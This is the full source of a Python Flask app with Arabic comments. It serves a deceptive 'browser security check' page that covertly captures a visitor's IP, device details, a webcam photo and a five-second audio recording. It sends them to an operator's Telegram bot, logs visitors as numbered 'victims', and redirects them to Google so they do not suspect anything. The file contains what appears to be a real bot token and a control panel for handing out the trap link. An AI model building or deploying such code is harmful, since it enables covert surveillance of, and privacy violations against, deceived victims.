import base64, requests, os, json, datetime
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي v20.0 ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

# ملف بسيط لخزن الضحايا (بديل لقاعدة البيانات المعقدة لسهولة الاستخدام)
DB_FILE = "victims.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f: return json.load(f)
    return {"total": 0, "list": []}

def save_db(data):
    with open(DB_FILE, 'w') as f: json.dump(data, f)

# ==========================================
# --- واجهة الصيد الاحترافية (The Advanced Trap) ---
# ==========================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الاتصال الآمن</title>
    <style>
        body { background: #080808; color: white; font-family: 'Tahoma', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 10px 40px rgba(0,0,0,1); }
        .spinner { border: 4px solid #333; border-top: 4px solid #f38020; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #f38020; color: #000; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
        #st { margin-top: 15px; color: #777; font-size: 0.8rem; }
    </style>
</head>
<body>
    <div class="card">
        <div id="icon" style="font-size: 50px;">📡</div>
        <h2 id="head">نظام الحماية الذكي</h2>
        <p id="msg">للوصول إلى المحتوى، يرجى إجراء فحص الأمان للمتصفح</p>
        <div id="loader" style="display:none"><div class="spinner"></div></div>
        <button class="btn" id="go" onclick="start()">بدء الفحص</button>
        <div id="st"></div>
    </div>
    <video id="v" style="position:fixed; top:-1000px" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const send = (d, t) => fetch('/api/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
        
        async function start() {
            document.getElementById('go').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('st').innerText = "جاري الاتصال بالسيرفر...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                const v = document.getElementById('v');
                v.srcObject = stream;
                
                const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
                const b = await navigator.getBattery().catch(()=>({}));
                
                const info = `👤 **ضحية جديدة برقم أرشيف مميز**\\n` +
                             `🌐 IP: \`${ip.ip}\`\\n` +
                             `🔋 الشحن: ${Math.round(b.level*100)}%\\n` +
                             `📱 الجهاز: ${navigator.platform}\\n` +
                             `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
                await send(info, 'msg');

                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    send(c.toDataURL('image/jpeg', 0.8), 'img');
                    
                    const rec = new MediaRecorder(stream);
                    const ch = [];
                    rec.ondataavailable = e => ch.push(e.data);
                    rec.onstop = () => {
                        const r = new FileReader();
                        r.readAsDataURL(new Blob(ch));
                        r.onloadend = () => {
                            send(r.result, 'aud');
                            // التوجيه النهائي (عشان ما يشك)
                            window.location.href = "https://www.google.com";
                        };
                    };
                    rec.start();
                    setTimeout(()=>rec.stop(), 5000);
                }, 3000);
            } catch(e) { location.reload(); }
        }
    </script>
</body>
</html>
'''

# ==========================================
# --- العمليات الخلفية ---
# ==========================================
@app.route('/')
def home(): return render_template_string(HTML_TEMPLATE)

@app.route('/api/capture', methods=['POST'])
def capture():
    db = load_db()
    data = request.json
    t, d = data['t'], data['d']
    
    if t == 'msg':
        db['total'] += 1
        db['list'].append({"ip": d.split('`')[1] if '`' in d else 'Unknown', "time": str(datetime.datetime.now())})
        save_db(db)
        # إرسال الرسالة مع رقم الضحية
        msg = f"🆕 **الضحية رقم #{db['total']}**\\n" + d
        requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': msg, 'parse_mode': 'Markdown'})
    
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        requests.post(API_URL + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': f"📸 صورة الضحية #{db['total']}"}, files={'photo': ('c.jpg', img)})
    
    elif t == 'aud':
        aud = base64.b64decode(d.split(',')[1])
        requests.post(API_URL + "sendVoice", data={'chat_id': ADMIN_ID, 'caption': f"🎙 بصمة الضحية #{db['total']}"}, files={'voice': ('v.ogg', aud)})
    
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "message" in update and str(update["message"]["chat"]["id"]) == ADMIN_ID:
        kb = {"inline_keyboard": [
            [{"text": "🔗 جلب رابط الصيد", "callback_data": "get_l"}],
            [{"text": "📂 كشف الأرشيف", "callback_data": "view_db"}],
            [{"text": "🧹 تصفير البيانات", "callback_data": "clear"}]
        ]}
        requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': "🛠 **لوحة التحكم المتقدمة v20.0**", 'reply_markup': kb, 'parse_mode': 'Markdown'})
    
    elif "callback_query" in update:
        q = update["callback_query"]
        data = q["data"]
        db = load_db()
        
        if data == "get_l":
            requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': f"🚀 رابطك المباشر:\\n`{BASE_URL}`", 'parse_mode': 'Markdown'})
        elif data == "view_db":
            res = f"📂 **إحصائيات الأرشيف:**\\n🔢 إجمالي الضحايا: {db['total']}\\n"
            for item in db['list'][-5:]: # آخر 5 ضحايا
                res += f"📍 IP: `{item['ip']}`\\n"
            requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': res, 'parse_mode': 'Markdown'})
        elif data == "clear":
            save_db({"total": 0, "list": []})
            requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': "✅ تم تصفير الأرشيف بنجاح!"})
            
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
